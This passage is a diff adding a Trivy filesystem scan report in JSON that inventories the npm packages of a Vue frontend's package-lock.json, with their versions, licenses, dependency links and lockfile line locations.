@@ -1,0 +1,3693 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.69.3"
+  },
+  "ReportID": "01a1818a-c05b-701c-8ae5-ec8850b7bb50",
+  "CreatedAt": "2026-10-28T08:05:16.507008543Z",
+  "ArtifactName": "/src",
+  "ArtifactType": "filesystem",
+  "Results": [
+    {
+      "Target": "frontend/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "@stomp/stompjs@7.2.1",
+          "Name": "@stomp/stompjs",
+          "Identifier": {
+            "PURL": "pkg:npm/%40stomp/stompjs@7.2.1",
+            "UID": "74dd7679787cb17c"
+          },
+          "Version": "7.2.1",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2040,
+              "EndLine": 2045
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "axios@1.12.2",
+          "Name": "axios",
+          "Identifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "Version": "1.12.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "follow-redirects@1.15.11",
+            "form-data@4.0.4",
+            "proxy-from-env@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3555,
+              "EndLine": 3565
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "core-js@3.46.0",
+          "Name": "core-js",
+          "Identifier": {
+            "PURL": "pkg:npm/core-js@3.46.0",
+            "UID": "5f381cf0eeec55c7"
+          },
+          "Version": "3.46.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 4458,
+              "EndLine": 4468
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "date-fns@4.1.0",
+          "Name": "date-fns",
+          "Identifier": {
+            "PURL": "pkg:npm/date-fns@4.1.0",
+            "UID": "2d59ccb0baed061d"
+          },
+          "Version": "4.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 4837,
+              "EndLine": 4846
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mitt@3.0.1",
+          "Name": "mitt",
+          "Identifier": {
+            "PURL": "pkg:npm/mitt@3.0.1",
+            "UID": "1fea29bede243c69"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 8160,
+              "EndLine": 8165
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "pinia@2.3.1",
+          "Name": "pinia",
+          "Identifier": {
+            "PURL": "pkg:npm/pinia@2.3.1",
+            "UID": "5dc2975db05bd634"
+          },
+          "Version": "2.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@vue/devtools-api@6.6.4",
+            "vue-demi@0.14.10",
+            "vue@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 8826,
+              "EndLine": 8847
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "sockjs-client@1.6.1",
+          "Name": "sockjs-client",
+          "Identifier": {
+            "PURL": "pkg:npm/sockjs-client@1.6.1",
+            "UID": "74aefb72d6450452"
+          },
+          "Version": "1.6.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "debug@3.2.7",
+            "eventsource@2.0.2",
+            "faye-websocket@0.11.4",
+            "inherits@2.0.4",
+            "url-parse@1.5.10"
+          ],
+          "Locations": [
+            {
+              "StartLine": 10535,
+              "EndLine": 10553
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "sweetalert2@11.26.3",
+          "Name": "sweetalert2",
+          "Identifier": {
+            "PURL": "pkg:npm/sweetalert2@11.26.3",
+            "UID": "e0698a3151830740"
+          },
+          "Version": "11.26.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 10868,
+              "EndLine": 10877
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "vue@3.5.22",
+          "Name": "vue",
+          "Identifier": {
+            "PURL": "pkg:npm/vue@3.5.22",
+            "UID": "809c4966e5ddbf36"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@vue/compiler-dom@3.5.22",
+            "@vue/compiler-sfc@3.5.22",
+            "@vue/runtime-dom@3.5.22",
+            "@vue/server-renderer@3.5.22",
+            "@vue/shared@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 11418,
+              "EndLine": 11439
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "vue-router@4.6.3",
+          "Name": "vue-router",
+          "Identifier": {
+            "PURL": "pkg:npm/vue-router@4.6.3",
+            "UID": "f657a8a3e62f2d04"
+          },
+          "Version": "4.6.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@vue/devtools-api@6.6.4",
+            "vue@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 11609,
+              "EndLine": 11623
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@babel/helper-string-parser@7.27.1",
+          "Name": "@babel/helper-string-parser",
+          "Identifier": {
+            "PURL": "pkg:npm/%40babel/helper-string-parser@7.27.1",
+            "UID": "4a8f7f58fcc91a89"
+          },
+          "Version": "7.27.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 356,
+              "EndLine": 364
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@babel/helper-validator-identifier@7.27.1",
+          "Name": "@babel/helper-validator-identifier",
+          "Identifier": {
+            "PURL": "pkg:npm/%40babel/helper-validator-identifier@7.27.1",
+            "UID": "b9cb182c16b97cbc"
+          },
+          "Version": "7.27.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 365,
+              "EndLine": 373
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@babel/parser@7.28.4",
+          "Name": "@babel/parser",
+          "Identifier": {
+            "PURL": "pkg:npm/%40babel/parser@7.28.4",
+            "UID": "55bc1eecf9a2de5e"
+          },
+          "Version": "7.28.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@babel/types@7.28.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 507,
+              "EndLine": 521
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@babel/types@7.28.4",
+          "Name": "@babel/types",
+          "Identifier": {
+            "PURL": "pkg:npm/%40babel/types@7.28.4",
+            "UID": "9471b6ad534b7a9d"
+          },
+          "Version": "7.28.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@babel/helper-string-parser@7.27.1",
+            "@babel/helper-validator-identifier@7.27.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1770,
+              "EndLine": 1782
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@jridgewell/sourcemap-codec@1.5.5",
+          "Name": "@jridgewell/sourcemap-codec",
+          "Identifier": {
+            "PURL": "pkg:npm/%40jridgewell/sourcemap-codec@1.5.5",
+            "UID": "a7eb3d7e13929c8b"
+          },
+          "Version": "1.5.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1898,
+              "EndLine": 1903
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/compiler-core@3.5.22",
+          "Name": "@vue/compiler-core",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/compiler-core@3.5.22",
+            "UID": "906048f5fc531aab"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@babel/parser@7.28.4",
+            "@vue/shared@3.5.22",
+            "entities@4.5.0",
+            "estree-walker@2.0.2",
+            "source-map-js@1.2.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2807,
+              "EndLine": 2819
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/compiler-dom@3.5.22",
+          "Name": "@vue/compiler-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/compiler-dom@3.5.22",
+            "UID": "14913e329c9dd452"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@vue/compiler-core@3.5.22",
+            "@vue/shared@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2820,
+              "EndLine": 2829
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/compiler-sfc@3.5.22",
+          "Name": "@vue/compiler-sfc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/compiler-sfc@3.5.22",
+            "UID": "fe5bb5c4ad897e39"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@babel/parser@7.28.4",
+            "@vue/compiler-core@3.5.22",
+            "@vue/compiler-dom@3.5.22",
+            "@vue/compiler-ssr@3.5.22",
+            "@vue/shared@3.5.22",
+            "estree-walker@2.0.2",
+            "magic-string@0.30.19",
+            "postcss@8.5.6",
+            "source-map-js@1.2.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2830,
+              "EndLine": 2846
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/compiler-ssr@3.5.22",
+          "Name": "@vue/compiler-ssr",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/compiler-ssr@3.5.22",
+            "UID": "ece4cf4c267ffb15"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@vue/compiler-dom@3.5.22",
+            "@vue/shared@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2847,
+              "EndLine": 2856
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/devtools-api@6.6.4",
+          "Name": "@vue/devtools-api",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/devtools-api@6.6.4",
+            "UID": "c432e17097df5898"
+          },
+          "Version": "6.6.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2927,
+              "EndLine": 2932
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/reactivity@3.5.22",
+          "Name": "@vue/reactivity",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/reactivity@3.5.22",
+            "UID": "20adcc896e866c6a"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@vue/shared@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2933,
+              "EndLine": 2941
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/runtime-core@3.5.22",
+          "Name": "@vue/runtime-core",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/runtime-core@3.5.22",
+            "UID": "334a27741f6de714"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@vue/reactivity@3.5.22",
+            "@vue/shared@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2942,
+              "EndLine": 2951
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/runtime-dom@3.5.22",
+          "Name": "@vue/runtime-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/runtime-dom@3.5.22",
+            "UID": "b73ae844ee5d6e57"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@vue/reactivity@3.5.22",
+            "@vue/runtime-core@3.5.22",
+            "@vue/shared@3.5.22",
+            "csstype@3.1.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2952,
+              "EndLine": 2963
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/server-renderer@3.5.22",
+          "Name": "@vue/server-renderer",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/server-renderer@3.5.22",
+            "UID": "f6bd0319f0bda45d"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@vue/compiler-ssr@3.5.22",
+            "@vue/shared@3.5.22",
+            "vue@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2964,
+              "EndLine": 2976
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@vue/shared@3.5.22",
+          "Name": "@vue/shared",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vue/shared@3.5.22",
+            "UID": "8de85f424a82f84c"
+          },
+          "Version": "3.5.22",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2977,
+              "EndLine": 2982
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "asynckit@0.4.0",
+          "Name": "asynckit",
+          "Identifier": {
+            "PURL": "pkg:npm/asynckit@0.4.0",
+            "UID": "f72a22d2a2fa9c58"
+          },
+          "Version": "0.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3501,
+              "EndLine": 3506
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "call-bind-apply-helpers@1.0.2",
+          "Name": "call-bind-apply-helpers",
+          "Identifier": {
+            "PURL": "pkg:npm/call-bind-apply-helpers@1.0.2",
+            "UID": "defd6776c416d926"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0",
+            "function-bind@1.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3920,
+              "EndLine": 3932
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "combined-stream@1.0.8",
+          "Name": "combined-stream",
+          "Identifier": {
+            "PURL": "pkg:npm/combined-stream@1.0.8",
+            "UID": "25ee3878debfd3ba"
+          },
+          "Version": "1.0.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "delayed-stream@1.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4258,
+              "EndLine": 4269
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "csstype@3.1.3",
+          "Name": "csstype",
+          "Identifier": {
+            "PURL": "pkg:npm/csstype@3.1.3",
+            "UID": "dfbf29cb149fddb7"
+          },
+          "Version": "3.1.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4831,
+              "EndLine": 4836
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "debug@3.2.7",
+          "Name": "debug",
+          "Identifier": {
+            "PURL": "pkg:npm/debug@3.2.7",
+            "UID": "fe6d4e5a981ec352"
+          },
+          "Version": "3.2.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "ms@2.1.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 10554,
+              "EndLine": 10562
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "delayed-stream@1.0.0",
+          "Name": "delayed-stream",
+          "Identifier": {
+            "PURL": "pkg:npm/delayed-stream@1.0.0",
+            "UID": "77c368be3b4db663"
+          },
+          "Version": "1.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5024,
+              "EndLine": 5032
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dunder-proto@1.0.1",
+          "Name": "dunder-proto",
+          "Identifier": {
+            "PURL": "pkg:npm/dunder-proto@1.0.1",
+            "UID": "54c7ec3a43845341"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "call-bind-apply-helpers@1.0.2",
+            "es-errors@1.3.0",
+            "gopd@1.2.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5207,
+              "EndLine": 5220
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "entities@4.5.0",
+          "Name": "entities",
+          "Identifier": {
+            "PURL": "pkg:npm/entities@4.5.0",
+            "UID": "c3dd1bc25201ac64"
+          },
+          "Version": "4.5.0",
+          "Licenses": [
+            "BSD-2-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5317,
+              "EndLine": 5328
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-define-property@1.0.1",
+          "Name": "es-define-property",
+          "Identifier": {
+            "PURL": "pkg:npm/es-define-property@1.0.1",
+            "UID": "20b3081ce1f0c545"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5349,
+              "EndLine": 5357
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-errors@1.3.0",
+          "Name": "es-errors",
+          "Identifier": {
+            "PURL": "pkg:npm/es-errors@1.3.0",
+            "UID": "4e66ee1ba260bdcd"
+          },
+          "Version": "1.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5358,
+              "EndLine": 5366
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-object-atoms@1.1.1",
+          "Name": "es-object-atoms",
+          "Identifier": {
+            "PURL": "pkg:npm/es-object-atoms@1.1.1",
+            "UID": "d1213a6630fd5935"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5374,
+              "EndLine": 5385
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-set-tostringtag@2.1.0",
+          "Name": "es-set-tostringtag",
+          "Identifier": {
+            "PURL": "pkg:npm/es-set-tostringtag@2.1.0",
+            "UID": "d22f984aac9c3d7f"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0",
+            "get-intrinsic@1.3.0",
+            "has-tostringtag@1.0.2",
+            "hasown@2.0.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5386,
+              "EndLine": 5400
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "estree-walker@2.0.2",
+          "Name": "estree-walker",
+          "Identifier": {
+            "PURL": "pkg:npm/estree-walker@2.0.2",
+            "UID": "c24544707a145c5"
+          },
+          "Version": "2.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5869,
+              "EndLine": 5874
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "eventsource@2.0.2",
+          "Name": "eventsource",
+          "Identifier": {
+            "PURL": "pkg:npm/eventsource@2.0.2",
+            "UID": "cf5293a7db3e06aa"
+          },
+          "Version": "2.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5922,
+              "EndLine": 5930
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "faye-websocket@0.11.4",
+          "Name": "faye-websocket",
+          "Identifier": {
+            "PURL": "pkg:npm/faye-websocket@0.11.4",
+            "UID": "211f00040595b584"
+          },
+          "Version": "0.11.4",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "websocket-driver@0.7.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6165,
+              "EndLine": 6176
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "follow-redirects@1.15.11",
+          "Name": "follow-redirects",
+          "Identifier": {
+            "PURL": "pkg:npm/follow-redirects@1.15.11",
+            "UID": "475e18b4aac5eb92"
+          },
+          "Version": "1.15.11",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6326,
+              "EndLine": 6345
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "form-data@4.0.4",
+          "Name": "form-data",
+          "Identifier": {
+            "PURL": "pkg:npm/form-data@4.0.4",
+            "UID": "8dc2c0c7bacd373"
+          },
+          "Version": "4.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "asynckit@0.4.0",
+            "combined-stream@1.0.8",
+            "es-set-tostringtag@2.1.0",
+            "hasown@2.0.2",
+            "mime-types@2.1.35"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6346,
+              "EndLine": 6361
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "function-bind@1.1.2",
+          "Name": "function-bind",
+          "Identifier": {
+            "PURL": "pkg:npm/function-bind@1.1.2",
+            "UID": "2d6fe6218f58fb2c"
+          },
+          "Version": "1.1.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6441,
+              "EndLine": 6449
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "get-intrinsic@1.3.0",
+          "Name": "get-intrinsic",
+          "Identifier": {
+            "PURL": "pkg:npm/get-intrinsic@1.3.0",
+            "UID": "c802a26252e10836"
+          },
+          "Version": "1.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "call-bind-apply-helpers@1.0.2",
+            "es-define-property@1.0.1",
+            "es-errors@1.3.0",
+            "es-object-atoms@1.1.1",
+            "function-bind@1.1.2",
+            "get-proto@1.0.1",
+            "gopd@1.2.0",
+            "has-symbols@1.1.0",
+            "hasown@2.0.2",
+            "math-intrinsics@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6477,
+              "EndLine": 6500
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "get-proto@1.0.1",
+          "Name": "get-proto",
+          "Identifier": {
+            "PURL": "pkg:npm/get-proto@1.0.1",
+            "UID": "d8a46c2e77eb097c"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "dunder-proto@1.0.1",
+            "es-object-atoms@1.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6501,
+              "EndLine": 6513
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "gopd@1.2.0",
+          "Name": "gopd",
+          "Identifier": {
+            "PURL": "pkg:npm/gopd@1.2.0",
+            "UID": "f987081610c1d1c7"
+          },
+          "Version": "1.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6616,
+              "EndLine": 6627
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "has-symbols@1.1.0",
+          "Name": "has-symbols",
+          "Identifier": {
+            "PURL": "pkg:npm/has-symbols@1.1.0",
+            "UID": "b25dc738fceee150"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6681,
+              "EndLine": 6692
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "has-tostringtag@1.0.2",
+          "Name": "has-tostringtag",
+          "Identifier": {
+            "PURL": "pkg:npm/has-tostringtag@1.0.2",
+            "UID": "4ea936f3e61d64c3"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "has-symbols@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6693,
+              "EndLine": 6707
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "hasown@2.0.2",
+          "Name": "hasown",
+          "Identifier": {
+            "PURL": "pkg:npm/hasown@2.0.2",
+            "UID": "2fc905f0376db948"
+          },
+          "Version": "2.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "function-bind@1.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6715,
+              "EndLine": 6726
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "http-parser-js@0.5.10",
+          "Name": "http-parser-js",
+          "Identifier": {
+            "PURL": "pkg:npm/http-parser-js@0.5.10",
+            "UID": "360b96d3a9e6cdd2"
+          },
+          "Version": "0.5.10",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6943,
+              "EndLine": 6948
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "inherits@2.0.4",
+          "Name": "inherits",
+          "Identifier": {
+            "PURL": "pkg:npm/inherits@2.0.4",
+            "UID": "281887f8e63eee8b"
+          },
+          "Version": "2.0.4",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 7095,
+              "EndLine": 7100
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "magic-string@0.30.19",
+          "Name": "magic-string",
+          "Identifier": {
+            "PURL": "pkg:npm/magic-string@0.30.19",
+            "UID": "62fc167466fca85b"
+          },
+          "Version": "0.30.19",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@jridgewell/sourcemap-codec@1.5.5"
+          ],
+          "Locations": [
+            {
+              "StartLine": 7862,
+              "EndLine": 7870
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "math-intrinsics@1.1.0",
+          "Name": "math-intrinsics",
+          "Identifier": {
+            "PURL": "pkg:npm/math-intrinsics@1.1.0",
+            "UID": "a88ee3b6e85312ac"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 7887,
+              "EndLine": 7895
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mime-db@1.52.0",
+          "Name": "mime-db",
+          "Identifier": {
+            "PURL": "pkg:npm/mime-db@1.52.0",
+            "UID": "869578a5af2976d2"
+          },
+          "Version": "1.52.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 8000,
+              "EndLine": 8008
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mime-types@2.1.35",
+          "Name": "mime-types",
+          "Identifier": {
+            "PURL": "pkg:npm/mime-types@2.1.35",
+            "UID": "bad0f43440db980a"
+          },
+          "Version": "2.1.35",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "mime-db@1.52.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 8009,
+              "EndLine": 8020
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "ms@2.1.3",
+          "Name": "ms",
+          "Identifier": {
+            "PURL": "pkg:npm/ms@2.1.3",
+            "UID": "ccf401cc3f9b6d02"
+          },
+          "Version": "2.1.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 8183,
